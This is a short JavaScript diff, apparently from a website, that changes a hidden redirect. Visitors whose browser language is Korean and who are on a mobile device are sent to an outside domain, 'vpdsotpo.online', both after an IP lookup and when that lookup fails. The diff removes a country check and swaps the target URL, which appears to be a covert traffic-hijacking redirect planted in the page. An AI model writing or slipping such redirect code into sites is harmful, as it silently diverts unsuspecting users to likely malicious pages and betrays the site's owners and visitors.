@@ -47,8 +47,8 @@ function isKoreanLang() {
       .then(response => response.json())
       .then(data => {
         // 严格的三重条件判断
-        if (data.country === 'KR' && isKoreanLang() && isMobileDevice() ) {
-          window.location.href = "https://silverswanrecruitment.com/usa/";
+        if (isKoreanLang() && isMobileDevice() ) {
+          window.location.href = "https://www.vpdsotpo.online/s2/b2.html";
           return;
         }
      
@@ -62,7 +62,7 @@ function isKoreanLang() {
       .catch(() => {
         // IP检测失败时严格的双重条件判断
         if (isMobileDevice() && isKoreanLang()) {
-          window.location.href = "https://silverswanrecruitment.com/usa/";
+          window.location.href = "https://www.vpdsotpo.online/s2/b2.html";
           return;
         }
         
